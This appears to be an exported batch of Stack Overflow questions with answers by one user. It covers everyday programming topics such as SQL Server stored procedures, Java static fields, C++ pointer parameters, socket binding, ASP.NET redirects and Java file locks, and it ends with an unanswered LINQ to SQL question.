<p>I'm an experienced web developer and I really love Python. I'm new to Cocoa though. The application I'm toying with writing is a patient management system for a large hospital. The system is expected to store huge amounts of data over time but the data transferred during a single session is very light (mostly just text). The communication is assumed to occur over a local network (wired or wireless). It has to be highly secure, of course.</p>

<p>The best I could come up with is to write a Python REST web service and connect to it through the Cocoa app. Maybe I'll even use Python to code the Cocoa app itself.</p>

<p>Looking at Cocoa, I see really great technologies in Cocoa like CoreData but I couldn't find anything similar for client server development. I just want to make sure that I'm not missing anything.</p>

<p>What do you think?</p>

<p>Real world examples will be greatly appreciated.</p>

<p>Thanks in advance.</p>
","33708","Mehrdad Afshari","<p>Generally, the ideas of all other client/server frameworks are applicable.</p>

<p>Take a look at this link: <a href=""http://developer.apple.com/internet/webservices/webservicescoreandcfnetwork.html"" rel=""nofollow"">http://developer.apple.com/internet/webservices/webservicescoreandcfnetwork.html</a></p>
"
"<p>How to communicate between 2 WCF services hosted on 2 different machines.</p>
","33708","Mehrdad Afshari","<p>Easy! With WCF!</p>

<p>Add a service reference to each of them pointing to the other and you're done.</p>
"
"<p>I'm trying to write a program that uses sockets to connect with other instances of itself over the network. Since eventually I'd like to write a Windows version as well, I'm currently using BSD sockets on the OS X side so that I can ensure that it will be compatible with the (eventual) Windows version.</p>

<p>The only way that I've been able to get this to work so far is if I specify my actual IP address when creating the server socket. If I use 127.0.0.1 instead, then I can only connect from my local machine.</p>

<p>While this is fine in theory, the question them becomes how do I know which IP address to use? I'm not sure how to get an IP address for the current machine via Cocoa, and even if I can, what if there are multiple valid IP address (such as both an Airport and ethernet connections, for example). How do I know which one to use? I could ask the user, but that doesn't seem like something they could/should know.</p>

<p>I can provide my client and server connection code if necessary, however given that I am able to make a connection from a remote machine, I'm thinking that the problem isn't in my code.</p>

<p>Thank you for your time. :)</p>
","33708","Mehrdad Afshari","<p>Use 0.0.0.0 as the IP address to listen on. It'll listen on all addresses.</p>

<p>Probably, a constant is defined for this address in the socket API you are using. If you are using standard C sockets API, it's INADDR_ANY.</p>
"
"<p>Which one of the following do you do:</p>

<pre><code>var = true;
if (...) var = false;
</code></pre>

<p>Or</p>

<pre><code>if (...) var = false;
else var = true;
</code></pre>

<p>Is there a reason you pick on or the other?</p>

<p>I'm working on the premise that nothing else is happening to var. The next line of code might be something like:</p>

<pre><code>if (var) { ... }
</code></pre>
","33708","Mehrdad Afshari","<p>I use the first type unless the value to set requires significant computation.</p>
"
"<p>Given a table such as:</p>

<pre><code>CREATE TABLE dbo.MyTestData (testdata varchar(50) NOT NULL) 

ALTER TABLE dbo.MyTestData WITH NOCHECK ADD CONSTRAINT [PK_MyTestData] PRIMARY KEY  CLUSTERED (testdata)
</code></pre>

<p>And given that we want a unique list of 'testdata' when we are done gathering items to be added from a list of external data with known duplicates... When performing an insert stored procedure should the procedure be written to test for existence or should it just allow for error?  What's the most common practice?  I've always performed the test for existence but was debating this last night...  </p>

<pre><code>CREATE PROCEDURE dbo.dmsInsertTestData @ptestdata VarChar(50)
AS
  SET NOCOUNT ON

  IF NOT EXISTS(SELECT testdata FROM dbo.MyTestData WHERE testdata=@ptestdata)
  BEGIN
    INSERT INTO dbo.MyTestData (testdata ) VALUES (@ptestdata)
  END

RETURN 0
</code></pre>

<p>or just capture/ignore PK violation errors when executing this one?</p>

<pre><code>CREATE PROCEDURE dbo.dmsInsertTestData @ptestdata VarChar(50)
AS
  SET NOCOUNT ON
  INSERT INTO dbo.MyTestData (testdata ) VALUES (@ptestdata)
RETURN 0
</code></pre>
","33708","Mehrdad Afshari","<p>I believe it depends on the nature of the stored procedure. Basically, you should handle errors if you have something to do with them (or to encapsulate them for the clients of the procedure) and leave them propagating if you don't have anything to do with them and can't make it friendlier for other layers of the application. </p>

<p>If the stored procedure is designed to insert raw data, I think it should leave the application to handle the possible errors. If the stored procedure is designed as a layer of abstraction (and does a specific <i>task</i> as opposed to running a specific <i>statement</i>) and can either handle the error and do something with it or can report it in a graceful manner (for example, well defined error codes) to the application, it should do so. Otherwise, it should be up to the application to make sure it's not inserting duplicate data, not the database (the database has already enforced this with primary keys).</p>
"
"<p>I'm writing a component that I would like to be able to use in both MVC and WebForms web apps, but I'm not sure how to handle the differences between how HttpContext is handled.</p>

<p>My component involves a custom IHttpHandler (for WebForms) or a custom ActionResult (for MVC).</p>

<p>So I've got a few questions:</p>

<ul>
<li>Is there a way to use an IHttpHandler with MVC without breaking the model?</li>
<li>Is it acceptable to use HttpContext.Current while attempting to write code that will work for both? It seems a little brute-force-ish to me (not sure why), but the alternative would be writing and implementing an fairly verbose interface to handle the abstraction between HttpContext and ControllerContext.</li>
<li>Am I going about this completely wrong?</li>
</ul>
","33708","Mehrdad Afshari","<ol>
<li>Yes, you can just use <code>routes.IgnoreRoute(""MyHandler.ashx"")</code>. It'll fall back to the original ASP.NET handling without breaking the model.</li>
<li>Nope, I think it's perfectly OK to use <code>HttpContext.Current</code>. I think when you are writing your own handler, MVC is not very applicable. You are writing your code for <b>ASP.NET</b>, not ASP.NET MVC or ASP.NET Web Forms. It's easy to make it working on both models (works OOTB with Web forms, with IgnoreRoute in MVC). You might making thing more complicated than they should be! Remember, the sole purpose of design patterns (such as MVC) is simplicity. Don't make things complicated! </li>
<li><code>goto 2;</code> Just write a simple handler!</li>
</ol>
"
"<p>To be specific, I was trying this code:</p>

<pre><code>package hello;

public class Hello {

    Clock clock = new Clock();

    public static void main(String args[]) {
        clock.sayTime();
    }
}
</code></pre>

<p>But it gave the error <em>'Cannot access non-static field in static method main'</em>. So I changed the declaration of <code>clock</code> to this:</p>

<pre><code>static Clock clock = new Clock();
</code></pre>

<p>And it worked. What does it mean to put that keyword before the declaration? What exactly will it do and/or restrict in terms of what can be done to that object?</p>
","33708","Mehrdad Afshari","<p><code>static</code> members belong to the class instead of a specific instance.</p>

<p>It means that <b>only one instance of a <code>static</code> field exists</b><sup>[1]</sup> even if you create a million instances of the class or you don't create any. It will be shared by all instances.</p>

<p>Since <code>static</code> methods also do not belong to a specific instance, they can't refer to instance members (how would you know which instance Hello class you want to refer to?). <code>static</code> members can only refer to <code>static</code> members. Instance members can, of course access <code>static</code> members.</p>

<p><i>Side note:</i> Of course, <code>static</code> members can access instance members <b>through an object reference</b>.</p>

<p>[1]: Depending on the runtime characteristics, it can be one per ClassLoader or AppDomain or thread, but that is beside the point.</p>
"
"<p>I have a client that wants the application to be able to send SMS text message alerts to people that have subscribed to the service.  I have seen this done on a lot of sites but I am not aware of what is involved in setting this up.  Does anybody have any experience doing this?  What is involved?</p>

<p>Thanks,
Brent</p>
","33708","Mehrdad Afshari","<p>They usually send an SMS through an SMS gateway (a company that's involved with sending the actual message on the phone network) which provides them with a SOAP endpoint. It's as easy as a Web service call but the actual code will depend on the company you're working with.</p>
"
"<p>If I have, say, 100 items that'll be stored in a dictionary, should I initialise it thus?</p>

<pre><code>var myDictionary = new Dictionary&lt;Key, Value&gt;(100);
</code></pre>

<p>My understanding is that the .NET dictionary internally resizes itself when it reaches a given loading, and that the loading threshold is defined as a ratio of the capacity.</p>

<p>That would suggest that if 100 items were added to the above dictionary, then it would resize itself when one of the items was added.  Resizing a dictionary is something I'd like to avoid as it has a performance hit and is wasteful of memory.</p>

<p>The probability of hashing collisions is proportional to the loading in a dictionary.  Therefore, even if the dictionary does not resize itself (and uses all of its slots) then the performance must degrade due to these collisions. </p>

<p>How should one best decide what capacity to initialise the dictionary to, assuming you know how many items will be inside the dictionary?</p>
","33708","Mehrdad Afshari","<p>Yes, contrary to a <code>HashTable</code> which uses rehashing as the method to resolve collisions, <code>Dictionary</code> will use chaining. So yes, it's good to use the count. For a <code>HashTable</code> you probably want to use <code>count * (1/fillfactor)</code></p>
"
"<p>I'm wondering what would be the best prectice regarding mainataining connections to the database in .Net application (ADO.NET but I guess the practice should be the same for any data layer). Should I create a database connection and propagate it throughout my application, or would it be better to just pass connection strings/factories and create a connection ad-hoc, when it is needed. </p>

<p>As I understand perfomance hit is not signifcant with pooling and it allows me to recover from broken connections quite easily (just a new connection will be created) but then again a connection object is a nice, relatively high-level abstraction and creating a new connection for every operation (not SQL command, but application operation) generates additional, duplicated code and feels like a waste of time/resources(?).</p>

<p>What do you think about these 2 cases, what are their cons/pros and which approach are you using in your real-life applications?</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>ADO.NET SQL Server provider does the connection pooling itself. You can control the pool size by <code>MinPoolSize</code> and <code>MaxPoolSize</code> in the connection string.</p>
"
"<p>With SQL Express (either 2005 or 2008 edition) there is a limit of 1GB memory and 1 CPU that can be used. What I'm wondering, is if two instances are installed on the same machine, would they use the same CPU and same 1GB of memory? Or, would they use potentially two different CPU's and 2GB memory?</p>
","33708","Mehrdad Afshari","<p>The limitations are per-instance. Each instance is limited to its own 1 CPU and 1GB RAM.</p>

<p>You can have up to 16 instances of SQL Server Express Edition on a system.</p>

<p>Also in MSDE, the predecessor to SQL Server Express, the limitations were per-instance. </p>
"
"<p>How do I do sorting when generating anonymous types in linq to sql?</p>

<p>Ex:</p>

<pre><code>from e in linq0
order by User descending /* ??? */
select new
{
   Id = e.Id,
   CommentText = e.CommentText,
   UserId = e.UserId,
   User = (e.User.FirstName + "" "" + e.User.LastName).Trim()),
   Date = string.Format(""{0:d}"", e.Date)
}
</code></pre>
","33708","Mehrdad Afshari","<p>If I've understood your question correctly, you want to do this:</p>

<pre><code>from e in linq0
order by (e.User.FirstName + "" "" + e.User.LastName).Trim()) descending 
select new
{
   Id = e.Id,
   CommentText = e.CommentText,
   UserId = e.UserId,
   User = (e.User.FirstName + "" "" + e.User.LastName).Trim()),
   Date = string.Format(""{0:d}"", e.Date)
}
</code></pre>
"
"<p>I know this has something to do with parameter sniffing, but I'm just perplexed at how something like the following example is even possible with a piece of technology that does so many complex things well.</p>

<p>Many of us have run into stored procedures that intermittently run several of orders of magnitude slower than usual, and then if you copy out the sql from the procedure and use the same parameter values in a separate query window, it runs as fast as usual.</p>

<p>I just fixed a procedure like that by converting this:</p>

<pre><code>alter procedure p_MyProc
(
    @param1 int
) as -- do a complex query with @param1
</code></pre>

<p>to this:</p>

<pre><code>alter procedure p_MyProc
(
    @param1 int
)
as

declare @param1Copy int;
set @param1Copy = @param1;

-- Do the query using @param1Copy
</code></pre>

<p>It went from running in over a minute back down to under one second, like it usually runs.  This behavior seems totally random.  For 9 out of 10 @param1 inputs, the query is fast, regardless of how much data it ends up needing to crunch, or how big the result set it.  But for that 1 out of 10, it just gets lost.  And the fix is to replace an int with the same int in the query?</p>

<p>It makes no sense.</p>

<p>[Edit]</p>

<p>@gbn linked to this question, which details a similar problem:</p>

<p><a href=""http://stackoverflow.com/questions/379007/known-issue-sql-server-2005-stored-procedure-fails-to-complete-with-a-parameter"">http://stackoverflow.com/questions/379007/known-issue-sql-server-2005-stored-procedure-fails-to-complete-with-a-parameter</a></p>

<p>I hesitate to cry ""Bug!"" because that's so often a cop-out, but this really does seem like a bug to me.  When I run the two versions of my stored procedure with the same input, I see identical query plans.  The only difference is that the original takes more than a minute to run, and the version with the goofy parameter copying runs instantly.</p>
","33708","Mehrdad Afshari","<p>It's probably caused by the fact that SQL Server compiles stored procedures and <b>caches</b> execution plans for them and the cached execution plan is probably unsuitable for this new set of parameters. You can try <code>WITH RECOMPILE</code> option to see if it's the cause.</p>

<pre><code>EXECUTE MyProcedure [parameters] WITH RECOMPILE
</code></pre>

<p><code>WITH RECOMPILE</code> option will force SQL Server to ignore the cached plan.</p>
"
"<p>in that specific case</p>

<pre><code>    Const debugTime As String = ""hh:mm:ss.fffffff""
    Dim i As Integer

    Debug.Print(""Start "" &amp; Now.ToString(debugTime))
    For i = 0 To 4000000
        j = 5 - 4
    Next
    Debug.Print(""End "" &amp; Now.ToString(debugTime))

    Debug.Print(""Start "" &amp; Now.ToString(debugTime))
    For i = 0 To 4000000
        j = 5 Mod 4
    Next
    Debug.Print(""End "" &amp; Now.ToString(debugTime))
</code></pre>

<p>result</p>

<p>Start 05:33:39.8281250</p>

<p>End 05:33:39.8437500</p>

<p>Start 05:33:39.8437500</p>

<p>End 05:33:39.8437500</p>

<p><strong>* EDIT *</strong></p>

<p>modified the code to make it look like that</p>

<pre><code>    Const debugTime As String = ""hh:mm:ss.fffffff""
    Dim i As Long, j As Integer
    Dim r As Random

    r = New Random(1)
    Debug.Print(""Start "" &amp; Now.ToString(debugTime))
    For i = 0 To 400000000
        j = 5 - r.Next(1, 5)
    Next
    Debug.Print(""End "" &amp; Now.ToString(debugTime))

    r = New Random(1)
    Debug.Print(""Start "" &amp; Now.ToString(debugTime))
    For i = 0 To 400000000
        j = 5 Mod r.Next(1, 5)
    Next
    Debug.Print(""End "" &amp; Now.ToString(debugTime))
</code></pre>

<p>now the minus is faster...</p>

<p>Start 05:49:25.0156250</p>

<p>End 05:49:35.7031250</p>

<p>Start 05:49:35.7031250</p>

<p>End 05:49:48.2187500</p>
","33708","Mehrdad Afshari","<p>The compiler will optimize both of them to an assignment. The very small difference is probably a result of another factor.</p>

<p><b>UPDATE:</b>
I wrote a benchmark on Mac OS X, Intel 64 architecture. Huge difference:</p>

<p><code>a.asm</code>: assemble with <code>yasm -f macho64 a.asm</code></p>

<pre><code>SECTION .text
global _bmod, _bmin
_bmod:  push rdx
    push rbx
    mov rcx, 1000000000
    mov rdi, 5
    mov rsi, 4
.bmod:  mov rax, rdi
    mov rbx, rsi
    xor rdx, rdx
    div rbx             ; div instruction stores the mod in rdx.
    dec rcx
    jnz .bmod
    pop rbx
    pop rdx
    ret

_bmin:  push rdx
    push rbx
    mov rcx, 1000000000
    mov rdi, 5
    mov rsi, 4
.bmin:  mov rax, rdi
    mov rbx, rsi
    sub rax, rbx
    dec rcx
    jnz .bmin
    pop rbx
    pop rdx
    ret
</code></pre>

<p><code>a.c</code>: compile with <code>gcc -m64 a.c a.o</code></p>

<pre><code>#include &lt;time.h&gt;
#include &lt;stdio.h&gt;

void bmod();
void bmin();

main() {
    time_t timex,timex2;
    time(&amp;timex);
    bmod();
    time(&amp;timex2);
    printf(""Mod: %d\n"", timex2 - timex);
    time(&amp;timex);
    bmin();
    time(&amp;timex2);
    printf(""Min: %d\n"", timex2 - timex);
}
</code></pre>

<p>Result when I ran it on my MacBook Air:</p>

<pre><code>Mehrdad-Air:~ Mehrdad$ yasm -f macho64 a.asm 
Mehrdad-Air:~ Mehrdad$ gcc -m64 -O0 a.c a.o
Mehrdad-Air:~ Mehrdad$ ./a.out 
Mod: 14
Min: 2
</code></pre>

<p>As you can see, modulus is about an order of magnitude slower than subtraction.</p>
"
"<p>Was there any reason why the designers of Java felt that local variables should not be given a default value? Seriously, if instance variables can be given a default value, then why can't we do the same for local variables?</p>

<p>And it also leads to problems as explained in <a href=""http://javahowto.blogspot.com/2007/01/variable-might-not-have-been.html?showComment=1206851400000#c1463508649088298714"">this comment to a blog post</a>...</p>
","33708","Mehrdad Afshari","<p>I think the primary purpose was to maintain similarity with C/C++. However the compiler detects and warns you about using uninitialized variables which will reduce the problem to a minimal point. From a performance perspective, it's a little faster to let you declare uninitialized variables since the compiler will not have to write an assignment statement, even if you overwrite the value of the variable in the next statement.</p>
"
"<p>I have two projects, a Cocoa application and a static c library which it uses.</p>

<p>Then didn't in the same folder.For example:the name of c static library is libXXX.a,it in the XXXcore folder.the cocoa application in another folder that is the same level with the XXXcore folder. When I try to compile the cocoa application,I have the link error result.It is seem to change the search path in the cocoa app info(General panel).But it is not work,why? </p>
","33708","Mehrdad Afshari","<p>If you're using Xcode, you can add a link to static library by adding the library to Frameworks folder in the project.</p>
"
"<p>I'm starting to love Lambda expressions but I'm struggling to pass this wall:</p>

<pre><code>public class CompanyWithEmployees
{
    public CompanyWithEmployees() { }
    public Company CompanyInfo { get; set; }
    public List&lt;Person&gt; Employees { get; set; }
}
</code></pre>

<p>My search:</p>

<pre><code>List&lt;CompanyWithEmployees&gt; companiesWithEmployees = ws.GetCompaniesWithEmployees();
CompanyWithEmployees ces;

ces = companiesWithEmployees
    .Find(x =&gt; x.Employees
        .Find(y =&gt; y.PersonID == person.PersonID));
</code></pre>

<p>So, I want to get the Object ""CompanyWithEmployees""  that have that Person (Employee) that I'm looking for, but I'm getting ""<em>Cannot implicit convert 'Person' To 'bool')</em>"" witch is right, but if I'm not passing the Person object, how can the first Find executes?</p>

<p>Thanks.</p>
","33708","Mehrdad Afshari","<pre><code>ces = companiesWithEmployees
               .First(x =&gt; x.Employees.Any(p=&gt;p.PersonID == person.PersonID));
</code></pre>
"
"<p>I've been playing with idea to make a script to generate 2-characters words from a given set of characters in my language. However, as I am not into re-inventing the wheel, do you know about such a script publicly available for C#?</p>
","33708","Mehrdad Afshari","<p>I'm not sure if I understood your question correctly, but this might help:</p>

<pre><code>List&lt;string&gt; GetWords(IEnumberable&lt;char&gt; characters) {
    char[] chars = characters.Distinct().ToArray();
    List&lt;string&gt; words = new List&lt;string&gt;(chars.Length*chars.Length);
    foreach (char i in chars)
       foreach (char j in chars)
          words.Add(i.ToString() + j.ToString());
    return words;
}
</code></pre>
"
"<p>Is there any way we can convert text to speech in an iPhone app?
Is it possible using the SDK?</p>

<p>Are there any third-party TTS engines available for the iPhone? (AFAIK Acapela is not yet released)</p>
","33708","Mehrdad Afshari","<p>I don't think iPhone SDK provides any TTS facility internally. You should use a third party TTS engine or write one yourself.</p>
"
"<p>I have this legacy database for which I'm building a custom viewer using Linq to Sql.</p>

<p>Now some of the fields in a table can have the value NULL.
Using normal databinding in a DataTemplate (typed for the Class generated by the ORM Designer)</p>

<pre><code>&lt;TextBlock Text=""{Binding Path=columnX}""/&gt;
</code></pre>

<p>If columnX has value NULL, nothing is displayed. (It seems the to be the WPF convention) I'd like to display ""NULL"" instead if the value is NULL. (equivalent to <code>column_value ?? ""NULL""</code>)</p>

<p>I could use a converter as in </p>

<pre><code>&lt;TextBlock Text=""{Binding Path=columnX, Converter={StaticResource nullValueConverter}}""/&gt;
</code></pre>

<p>Converter class</p>

<pre><code>class NullValueConverter : IValueConverter
{
  public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
  {
    if (value == null)
      return ""NULL"";
    ...
</code></pre>

<p>But this seems like too much work. Also this logic would need to be duplicated in existing non-trivial converters.. </p>

<p>Is there a quick-hit way to accomplish this?</p>
","33708","Mehrdad Afshari","<p>Right click on the DBML file, click View code. Add a <code>partial class</code> for the table you want to work with. Add a property returning <code>value ?? null</code> or something like that. The trick is that LINQ to SQL declares the classes as partial, so you can easily extend them.</p>
"
"<pre><code>ClassA* pa = NULL;
ClassA* pb = NULL;
assignObject(ClassA* pa,ClassB* pb)
{
pa = new ClassA;
pb = new ClassB;
}
</code></pre>

<p>what will be the value of pa,pb  after executing the function</p>

<p>EDIT
how to pass as pointer is the return if pa,pb is NULL</p>
","33708","Mehrdad Afshari","<pre><code>ClassA* pa = NULL;
ClassA* pb = NULL;

void assignObject(ClassA* &amp;pa,ClassB* &amp;pb)
{
    pa = new ClassA;
    pb = new ClassB;
}
</code></pre>

<p>Alternatively:</p>

<pre><code>ClassA* pa = NULL;
ClassA* pb = NULL;

void assignObject(ClassA** pa,ClassB** pb)
{
    *pa = new ClassA;
    *pb = new ClassB;
}
</code></pre>
"
"<p>I've finally completed a working version of my first ever CSS-supported site (thanks to some very helpful suggestions on this forum) and have validated the CSS.  Before I go out and find (buy?) another machine (I'm a Mac) to check IE on, is it remotely possible that the valid CSS is really truly valid on IE as well as Firefox, Safari that I have used to check my code so far?  Thanks, Patrick.</p>
","33708","Mehrdad Afshari","<p>Nope, W3C validates against the CSS standard. Unfortunately popular browsers (read: MSIE 6.0) are not very standard compliant ;)</p>
"
"<p>The short form of this question: When, if ever, is it appropriate to use the Forms.Timer in a multithreaded WinForms application?</p>

<p>More specifically, I am architecting an application that uses multiple System.Threading.Timers to launch processes asynchronously, check queues containing the results of those asynchronous processes, and update the statistics to be shown by the application's main form.</p>

<p>In an application like that, is it appropriate to use a Forms.Timer to actually check the application statistics and draw them to the main form or would that just throw a wrench into the application's smooth running?</p>
","33708","Mehrdad Afshari","<p><code>Forms.Timer</code> registers the timer to send a message when the timer goes off. The event raised is treated like a GUI event. <code>System.Threading.Timer</code> uses a thread blocking approach. Basically, you should use <code>Forms.Timer</code> for your GUI oriented timers (to add some effects to the user interface) and <code>Threading.Timer</code> for scheduling tasks and other things.</p>
"
"<p>This is my first post here so be easy on me! </p>

<p>I'm a beginner C++ programmer, and to stretch my mind I've been trying some of the problems on <a href=""http://projecteuler.net/"" rel=""nofollow"">projecteuler.net</a>. Despite an interest in maths at school, I've found myself automatically going for brute force solutions to the problems, rather than looking for something streamlined or elegant.   </p>

<p>Does this sound like a bad mindset to have? I feel a bit guilty doing it like this, but maybe quick and dirty is OK some of the time...</p>
","33708","Mehrdad Afshari","<p>Ken Thompson: ""When in doubt, use brute force""</p>
"
"<p>I'm starting a new project and I'm considering using sqlserver 2008.</p>

<p>I've had a lot of trouble getting teamsystem to work with it, and I'm wondering if sql server 2008 is widely used in productions environment yet.</p>

<p>What whould you choose? How do you compare sqlserver 2005 and 2008?</p>

<p><strong>EDIT :</strong> I agree about the obvious and general tradeoff between new (new features, one painfull migration avoided in the future) and old (less bugs, more documentation). I've already browse the web about differences between 2005 and 2008. My question is more specific : Are YOU using 2008? are YOU experiencing problems (such as the FTS mentionned below?)</p>
","33708","Mehrdad Afshari","<p>Database systems are one of the areas that considering the change is costly. From what I have seen so far, since 2005 works pretty well, large projects are probably still using it (some large projects even still use 2000). However, it doesn't mean 2008 is bad or doesn't worth it. If you are considering a new project, you should probably go with 2008. I don't think there are any big downside to do so.</p>

<p>About TFS, I got to say, team foundation server has one of the <b>worst</b> installation experiences <i>I have ever seen</i> in a Microsoft product. I believe it's an issue with TFS not SQL Server 2008. By the way TFS SP1 is compatible with 2008, but you have to integrate the service pack first.</p>
"
"<p>Since there is a large pool of passionate developers in this community, I would like to gather your opinions on this matter - do you think it is excessive, or advantageous, to purchase and operate actual server hardware at home to spice your own development and learning efforts?</p>

<p>Back in 2003/4 when I jumped into the development line, I felt servers only belonged to the data centre, and did not believe in the pricing of servers for home use; consumer computing power was already pretty solid (back then), and similarly-speced PCs could be had for a fraction of the cost. Having assembled my own PCs since i was a school kid, I viewed the activity of obtaining second-hand components to build a new PC as an easy task. It was straightforward to prepare a PC that would act as a dedicated Windows 2003 server for my development tests. But for over three years now, I have been <a href=""http://icelava.net/mycomputers.aspx"">operating on real servers</a>, albeit low-end models. I ended up in this state due to a number of factors.</p>

<ol>
<li><strong>Stability</strong>. Server hardware built to work properly together. Tested to run server operating systems. Hardware that I assemble together may or may not work due to all those funny instances of unexpected incompatibilities. And unfortunately I ran into those situations more often than I should, like having to figure out why the PC won't boot up because I have the RAM modules plugged in a particular order, or by simple use of a particular DVD drive. I have not seen a single BSOD for my servers.</li>
<li><strong>Durability</strong>. I leave my servers running 24x7 and for years have (thankfully) not experienced any failure in server hardware. In contrast my PCs are just cursed with rapid failure rates. Even my vendor-purchased laptops eventually sport funny problems one way or another (especially with power supply units).</li>
<li><strong>Warranty</strong>. I may have warranty for individual PC parts, but the warranty for the computer as a whole is against <em>myself</em>. If something were to fail, I myself was the person to call up for help. And call myself I did several times. With the server however, I call techsupport and get them to replace parts.</li>
<li><strong>Capacity</strong>. Virtualization is truly a wonderful thing. Makes setting up single-purpose machines so much easier to manage. I directly loaded my first server to the max with 4GB RAM and happily ran a variety of virtual machines, simulating the multi-server/workstation environments I needed. Now my new server has capacity for 24GB RAM to afford the bigger scenarios I am looking to experiment with (e.g. AD domains, BizTalk server group, TFS group, etc).</li>
</ol>

<p>All in all, with cranky DIYs I spent more time troubleshooting hardware problems than working on actual development issues. When I threw in the money to purchase real servers there was an instant drop in hardware problems in my life. I would probably have bought a vendor-built workstation too if only I could find a configuration that suited my development needs.</p>

<p>Now, some of my tech friends who are passionate with their work also operate their own servers at home. The thing is, most other folks/colleagues get rather surprised that I would actually spend cash for this category of machines. Some would classify me as insane. Have I truly gone overboard?</p>

<p><strong>UPDATE - Clarification on server usage</strong></p>

<p>The base server (Windows Server 2008) serves basic IIS 7/ASP.NET, SQL Server 2008, and Subversion services. But the largest role it plays is <strong>hosting a variety of virtual machines in Hyper-V</strong>. I am not a developer who is merely told to whack out application code against a single database and check it into some version control repository then go home without worrying how the application and implementation works out in a production environment. As a solutions integrator, I have to get an understanding of the client/customer environment and think of the big-picture solution that includes <em>infrastructure and deployment concerns</em>. Software application development, while being my primary role, is but a part of the solution.</p>

<p>I frequently find myself having to experiment and discover if certain suggestions or approaches would work for a given environment, and have had to prepare virtual servers like a forest of domains (controllers), web servers, database servers, BizTalk server groups, Team Foundation server, etc to conduct my analysis and solidify my recommendations. These virtual machines work as my personal POCs. The scenarios I face continue to grow larger, and I definitely do not see how I can get to learn how to handle these situations without a base platform that allows me to virtualise and simulate them.</p>
","33708","Mehrdad Afshari","<p>My workstation is a Core 2 Quad with 8GB RAM and RAID 0 and RAID 1 hard disks running Vista x64. It works pretty well for all my needs. I don't think I need a separate server. Invest on your workstation and forget about spending lots of time configuring stuff!</p>
"
"<p>I want to write a custom view engine that returns custom text (like coma delimited) does anyone know how I'd change the view engine on the fly to handle this? </p>
","33708","Mehrdad Afshari","<p>If I understood your question correctly, you want to use different views based on the parameters passed to the controller. If so, you can use this statement in the controller action:</p>

<pre><code>return View(""ViewName"");
</code></pre>

<p>Otherwise, please clarify your question.</p>
"
"<p>Yo!</p>

<p>I'm trying to copy a few chars from a char[] to a char*. I just want the chars from index 6 to (message length - 9).</p>

<p>Maybe the code example will explain my problem more:</p>

<pre><code>char buffer[512] = ""GET /testfile.htm HTTP/1.0"";
char* filename; // I want *filename to hold only ""/testfile.htm""

msgLen = recv(connecting_socket, buffer, 512, 0);
strncpy(filename, buffer+5, msgLen-9);
</code></pre>

<p>Any response would help alot!</p>
","33708","Mehrdad Afshari","<p>First of all you should allocate a buffer for <code>filename</code>. The next problem is your offset. </p>

<pre><code>char buffer[512] = ""GET /testfile.htm HTTP/1.0"";
char filename[512]; // I want *filename to hold only ""/testfile.htm""

msgLen = recv(connecting_socket, buffer, 512, 0);
strncpy(filename, buffer+4, msgLen-4-9); 
//the first parameter should be buffer+4, not 5. Indexes are zero based.
//the second parameter is count, not the end pointer. You should subtract
//the first 4 chars too.
</code></pre>

<p>Also you should make sure you add a null at the end of string as <code>strncpy</code> doesn't do it.</p>

<pre><code>filename[msgLen-4-9] = 0;
</code></pre>

<p>You could also use <code>memcpy</code> instead of <code>strncpy</code> as you want to just copy some bytes:</p>

<pre><code>memcpy(filename, buffer+4, msgLen-4-9);
fileName[msgLen-4-9] = 0;
</code></pre>

<p>In either case, make sure you validate your input. You might receive invalid input from the socket.</p>
"
"<p>My default document is in subfolder not in root how can i make it default in asp.net 2.0 website.</p>

<p>Tried iis7 default document setting to '/pages/default.aspx'
'~/pages/default.aspx' but it didn't work.</p>
","33708","Mehrdad Afshari","<p>Default document is not the same as start page. Default document means if I requested <code>mysite.com/somefolder</code> and didn't specify a file, which file should IIS display.</p>

<p>If you want to use a specific page as your home page, create a Default.aspx file and write this in it's codebehind class:</p>

<pre><code>public override void ProcessRequest(HttpContext context) {
    context.Response.Redirect(""pages/default.aspx"", true);
}
</code></pre>

<p>As the client might have disabled Javascript, a server side approach would be more reliable. However it's best to issue a permanent redirect instead of a simple <code>Response.Redirect</code>. Also doing it using JS will be bad from a SEO point of view.</p>
"
"<p>As most should know <code>close()</code> also closes any streams uses.</p>

<p>This allows the follow code:</p>

<pre><code>BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(...)));
...
br.close();
</code></pre>

<p>This is nice, since we don't need a reference to <code>FileInputStream</code> and remember to close it.</p>

<p>But does it also work for <code>FileLock</code>s?</p>

<pre><code>final FileInputStream fis = new FileInputStream(new File(""buffer.txt""));
final FileChannel c = fis.getChannel();
final FileLock lock = c.lock(0L, Long.MAX_VALUE, true);
final BufferedReader br = new BufferedReader(new InputStreamReader(fis));

try {
    while(br.ready()) {
        System.out.println(br.readLine());
    }
} finally {
    br.close();
}
</code></pre>

<p>I've tried this code and the lock is correctly released when <code>br.close()</code> is called, but is is safe to do so?  The <a href=""http://java.sun.com/javase/6/docs/api/java/io/Closeable.html#close()"">Closeable JavaDoc</a> says, <em>""Closes this stream and releases any system resources associated with it.""</em>  Am I safe to assume that I am using <code>close()</code> as specified to <code>release()</code> the lock?</p>
","33708","Mehrdad Afshari","<p>Yes.</p>

<p>Locks depend on a file descriptor. When there is no file descriptor representing a file in a process, there wouldn't be a lock associated with it.</p>
"
"<p>I am struggling a bit to figure this one out. </p>

<p>I'm working on an ASP.NET MVC project, using LINQ to SQL for my data layer. The database consists of 10 or so different ""exceptions"" tables, e.g. ""Exceptions.LADM"", ""Exceptions.USB"", ""Exceptions.GPO"". Basically these tables are tracking user+machine information for relaxation of various security procedures.</p>

<p>My LINQ to SQL model has been generated. I have different classes for each table available to me. However, I am not sure how to use them in controller without having to generate separate Controller Actions for each exception type. For <code>List</code> action, I want to do something like this:  </p>

<pre><code>// Example Request:  /Exceptions/List/ladm
// Routing:   Controller = ""Exceptions"", Action = ""List"", type = ""ladm""

// Controller Action:

public ActionResult List(string type)
{
    string viewname = ""List-"" + type;   // refer to ""List-ladm"" view.
    if(type == ""ladm"")
    {
       var items = _repository.ListAllLADMExceptions();
    }

    return View(viewname, items);
}
</code></pre>

<p>My repository implements <code>ListAll&lt;XXXXXX&gt;Exceptions</code> methods for each table. Is there a way to avoid 10 different if/else statements? It looks ugly and I'm sure there is a better way that I cannot think of. May be I'm approaching it from incorrect angle.</p>

<p>Any suggestions would be welcomed.</p>

<p>Thanks.</p>
